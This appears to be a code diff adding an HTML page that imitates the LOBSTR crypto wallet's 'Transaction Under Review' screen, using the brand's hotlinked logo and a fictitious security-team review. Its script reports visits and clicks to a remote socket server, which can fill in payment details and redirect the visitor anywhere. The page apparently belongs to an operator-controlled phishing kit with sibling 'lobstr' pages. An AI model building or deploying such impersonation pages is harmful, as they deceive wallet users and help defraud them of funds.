@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="/socket.io/socket.io.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Review Pending</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --lobstr-teal: #1B8DA0;
+            --lobstr-light-teal: #E8F4F6;
+            --lobstr-dark-teal: #156B7D;
+            --lobstr-white: #FFFFFF;
+            --lobstr-gray: #F8F9FA;
+            --lobstr-text: #333333;
+            --lobstr-light-gray: #E9ECEF;
+            --lobstr-warning: #FFC107;
+            --lobstr-warning-light: #FFF8E1;
+            --spacing-1: 8px;
+            --spacing-2: 16px;
+            --spacing-3: 24px;
+            --spacing-4: 32px;
+            --spacing-5: 40px;
+            --border-radius: 8px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+            background-color: var(--lobstr-white);
+            color: var(--lobstr-text);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: var(--spacing-3);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: var(--spacing-5);
+        }
+
+        .logo {
+            height: 48px;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--lobstr-text);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .card {
+            background: var(--lobstr-white);
+            border: 1px solid var(--lobstr-light-gray);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-4);
+            margin-bottom: var(--spacing-3);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .pending-icon {
+            text-align: center;
+            margin-bottom: var(--spacing-3);
+        }
+
+        .pending-spinner {
+            width: 80px;
+            height: 80px;
+            background: var(--lobstr-warning);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            position: relative;
+            animation: pendingPulse 2s infinite;
+        }
+
+        .pending-spinner::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 3px solid var(--lobstr-warning);
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes pendingPulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 0.8;
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .pending-status {
+            text-align: center;
+            margin-bottom: var(--spacing-4);
+        }
+
+        .status-message {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--lobstr-warning);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .status-description {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .transaction-details {
+            margin-bottom: var(--spacing-4);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: var(--spacing-1) 0;
+            border-bottom: 1px solid var(--lobstr-light-gray);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            font-size: 14px;
+            color: var(--lobstr-text);
+            font-weight: 500;
+        }
+
+        .amount-value {
+            color: var(--lobstr-teal);
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: var(--spacing-2);
+            margin-top: var(--spacing-3);
+        }
+
+        .action-button {
+            flex: 1;
+            padding: var(--spacing-2) var(--spacing-3);
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Ubuntu', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .primary-button {
+            background: var(--lobstr-teal);
+            color: var(--lobstr-white);
+        }
+
+        .primary-button:hover {
+            background: var(--lobstr-dark-teal);
+        }
+
+        .secondary-button {
+            background: var(--lobstr-white);
+            color: var(--lobstr-teal);
+            border: 1px solid var(--lobstr-teal);
+        }
+
+        .secondary-button:hover {
+            background: var(--lobstr-light-teal);
+        }
+
+        .warning-button {
+            background: var(--lobstr-warning);
+            color: var(--lobstr-white);
+        }
+
+        .warning-button:hover {
+            background: #E0A800;
+        }
+
+        .pending-info {
+            background: var(--lobstr-warning-light);
+            border: 1px solid var(--lobstr-warning);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-top: var(--spacing-3);
+        }
+
+        .pending-info-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #E65100;
+            margin-bottom: var(--spacing-2);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+        }
+
+        .pending-info-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .pending-info-item {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+            font-size: 14px;
+            color: #E65100;
+            margin-bottom: var(--spacing-1);
+        }
+
+        .pending-info-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+            justify-content: center;
+            margin-top: var(--spacing-2);
+            font-size: 14px;
+            color: #666;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--lobstr-warning);
+            border-radius: 50%;
+            animation: statusPulse 2s infinite;
+        }
+
+        @keyframes statusPulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        .review-note {
+            background: var(--lobstr-light-teal);
+            border: 1px solid var(--lobstr-teal);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-bottom: var(--spacing-3);
+            text-align: center;
+        }
+
+        .review-note-text {
+            font-size: 14px;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-2);
+        }
+
+        .review-note-emphasis {
+            font-weight: 600;
+            color: var(--lobstr-teal);
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: var(--spacing-2);
+            }
+            
+            .card {
+                padding: var(--spacing-3);
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .status-message {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR" class="logo">
+            <h1 class="title">Transaction Under Review</h1>
+            <p class="subtitle">Your transaction is being processed</p>
+        </div>
+
+        <div class="review-note">
+            <div class="review-note-text">
+                Your transaction requires additional verification and is currently under review.
+            </div>
+            <div class="review-note-emphasis">
+                Please wait while we process your request
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="pending-icon">
+                <div class="pending-spinner">⏱</div>
+            </div>
+
+            <div class="pending-status">
+                <div class="status-message">Under Review</div>
+                <div class="status-description" id="statusDescription">Your transaction is being verified by our security team</div>
+                <div class="status-indicator">
+                    <span class="status-dot"></span>
+                    <span>Processing...</span>
+                </div>
+            </div>
+
+            <div class="transaction-details" id="transactionDetails">
+                <div class="detail-row">
+                    <span class="detail-label">Transaction Type</span>
+                    <span class="detail-value" id="transactionType">Payment</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Amount</span>
+                    <span class="detail-value amount-value" id="amount">---</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Recipient</span>
+                    <span class="detail-value" id="recipient">---</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Status</span>
+                    <span class="detail-value" id="status">Pending Review</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Submitted</span>
+                    <span class="detail-value" id="submittedTime">---</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Estimated Review Time</span>
+                    <span class="detail-value">5-15 minutes</span>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="action-button secondary-button" onclick="viewDetails()">
+                    View Details
+                </button>
+                <button class="action-button warning-button" onclick="cancelTransaction()" id="cancelBtn">
+                    Cancel
+                </button>
+                <button class="action-button primary-button" onclick="refreshStatus()">
+                    Refresh Status
+                </button>
+            </div>
+        </div>
+
+        <div class="pending-info">
+            <div class="pending-info-title">
+                <span>ℹ️</span>
+                Why is my transaction under review?
+            </div>
+            <ul class="pending-info-list">
+                <li class="pending-info-item">
+                    <span>•</span>
+                    Large transaction amounts require additional verification
+                </li>
+                <li class="pending-info-item">
+                    <span>•</span>
+                    New recipient addresses are verified for security
+                </li>
+                <li class="pending-info-item">
+                    <span>•</span>
+                    Suspicious activity patterns trigger automatic review
+                </li>
+                <li class="pending-info-item">
+                    <span>•</span>
+                    This helps protect your account and funds
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <script src="/js/socket-client.js"></script>
+    <script>
+        let transactionId = null;
+        let reviewStartTime = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Apply custom LOBSTR styling
+            const style = document.createElement('style');
+            style.textContent = `
+                body { 
+                    font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+                    background: #ffffff !important;
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Socket connection for real-time updates
+            socket.emit('page_visit', {
+                page: window.location.pathname
+            });
+
+            // Initialize review timer
+            reviewStartTime = new Date();
+            updateSubmittedTime();
+
+            // Request pending transaction details
+            socket.emit('request_pending_review_details');
+
+            // Set up periodic status checks
+            setInterval(checkReviewStatus, 10000); // Check every 10 seconds
+        });
+
+        function updateSubmittedTime() {
+            if (reviewStartTime) {
+                const timeString = reviewStartTime.toLocaleDateString('en-US', {
+                    year: 'numeric',
+                    month: 'short',
+                    day: 'numeric'
+                }) + ' at ' + reviewStartTime.toLocaleTimeString('en-US', {
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    timeZoneName: 'short'
+                });
+                document.getElementById('submittedTime').textContent = timeString;
+            }
+        }
+
+        function viewDetails() {
+            // Emit socket event for detail view
+            socket.emit('view_pending_transaction_details', {
+                transactionId: transactionId,
+                page: window.location.pathname
+            });
+
+            // Show detailed view or modal
+            alert('Transaction details will be displayed in a popup.');
+        }
+
+        function cancelTransaction() {
+            if (confirm('Are you sure you want to cancel this transaction? This action cannot be undone.')) {
+                // Emit socket event for cancellation
+                socket.emit('cancel_pending_transaction', {
+                    transactionId: transactionId,
+                    page: window.location.pathname
+                });
+
+                // Update UI to show canceling state
+                document.getElementById('status').textContent = 'Cancelling...';
+                document.getElementById('cancelBtn').disabled = true;
+                document.getElementById('cancelBtn').textContent = 'Cancelling...';
+            }
+        }
+
+        function refreshStatus() {
+            // Emit socket event for status refresh
+            socket.emit('refresh_pending_status', {
+                transactionId: transactionId,
+                page: window.location.pathname
+            });
+
+            // Show loading state
+            const statusDescription = document.getElementById('statusDescription');
+            statusDescription.textContent = 'Checking status...';
+        }
+
+        function checkReviewStatus() {
+            // Automatic status check
+            socket.emit('auto_check_review_status', {
+                transactionId: transactionId,
+                page: window.location.pathname
+            });
+        }
+
+        // Socket event handlers
+        socket.on('connect', () => {
+            console.log('Connected to LOBSTR secure server');
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('LOBSTR connection error:', error);
+        });
+
+        socket.on('redirect', (url) => {
+            // Update URL to use lobstr prefixed pages
+            if (url.includes('completed')) {
+                window.location.href = '/pages/lobstrCompleted.html';
+            } else if (url.includes('failed') || url.includes('error')) {
+                window.location.href = '/pages/lobstrError.html';
+            } else {
+                window.location.href = url;
+            }
+        });
+
+        socket.on('session_url', (url) => {
+            if (url && url !== window.location.pathname + window.location.search) {
+                window.history.replaceState({}, '', url);
+            }
+        });
+
+        socket.on('pending_review_details', (data) => {
+            if (data.transactionId) {
+                transactionId = data.transactionId;
+            }
+            if (data.amount) {
+                document.getElementById('amount').textContent = `${data.amount} XLM`;
+            }
+            if (data.recipient) {
+                // Truncate long addresses for display
+                const truncated = data.recipient.length > 20 
+                    ? `${data.recipient.substring(0, 8)}...${data.recipient.substring(data.recipient.length - 8)}`
+                    : data.recipient;
+                document.getElementById('recipient').textContent = truncated;
+            }
+            if (data.type) {
+                document.getElementById('transactionType').textContent = data.type;
+            }
+            if (data.submittedAt) {
+                reviewStartTime = new Date(data.submittedAt);
+                updateSubmittedTime();
+            }
+        });
+
+        socket.on('review_status_update', (data) => {
+            const statusDescription = document.getElementById('statusDescription');
+            const status = document.getElementById('status');
+            
+            if (data.status === 'approved') {
+                status.textContent = 'Approved';
+                statusDescription.textContent = 'Your transaction has been approved and is being processed';
+                // Redirect to processing or completed page
+                setTimeout(() => {
+                    window.location.href = '/pages/lobstrCompleted.html';
+                }, 2000);
+            } else if (data.status === 'rejected') {
+                status.textContent = 'Rejected';
+                statusDescription.textContent = 'Your transaction has been rejected. Please contact support for more information.';
+                document.querySelector('.status-message').textContent = 'Transaction Rejected';
+                document.querySelector('.status-message').style.color = '#DC3545';
+            } else if (data.status === 'cancelled') {
+                status.textContent = 'Cancelled';
+                statusDescription.textContent = 'Your transaction has been cancelled';
+                document.querySelector('.status-message').textContent = 'Transaction Cancelled';
+                document.querySelector('.status-message').style.color = '#6C757D';
+                document.getElementById('cancelBtn').style.display = 'none';
+            } else {
+                statusDescription.textContent = data.message || 'Your transaction is being verified by our security team';
+            }
+        });
+
+        socket.on('transaction_cancelled', (data) => {
+            document.getElementById('status').textContent = 'Cancelled';
+            document.getElementById('statusDescription').textContent = 'Transaction has been cancelled successfully';
+            document.querySelector('.status-message').textContent = 'Transaction Cancelled';
+            document.querySelector('.status-message').style.color = '#6C757D';
+            
+            // Hide cancel button and update UI
+            document.getElementById('cancelBtn').style.display = 'none';
+            
+            // Redirect to wallet after delay
+            setTimeout(() => {
+                window.location.href = '/pages/lobstrEstimatedBalance.html';
+            }, 3000);
+        });
+
+        socket.on('review_time_estimate', (data) => {
+            if (data.estimatedTime) {
+                const detailRows = document.querySelectorAll('.detail-row');
+                detailRows.forEach(row => {
+                    if (row.querySelector('.detail-label').textContent === 'Estimated Review Time') {
+                        row.querySelector('.detail-value').textContent = data.estimatedTime;
+                    }
+                });
+            }
+        });
+
+        // Enhanced error handling
+        socket.on('error', (error) => {
+            console.error('Socket error:', error);
+            document.getElementById('statusDescription').textContent = 'Connection error. Please refresh the page.';
+        });
+
+        // Auto-refresh page if review takes too long
+        setTimeout(() => {
+            if (document.getElementById('status').textContent === 'Pending Review') {
+                socket.emit('review_timeout_check', {
+                    transactionId: transactionId,
+                    startTime: reviewStartTime,
+                    page: window.location.pathname
+                });
+            }
+        }, 900000); // 15 minutes
+    </script>
+</body>
+</html>
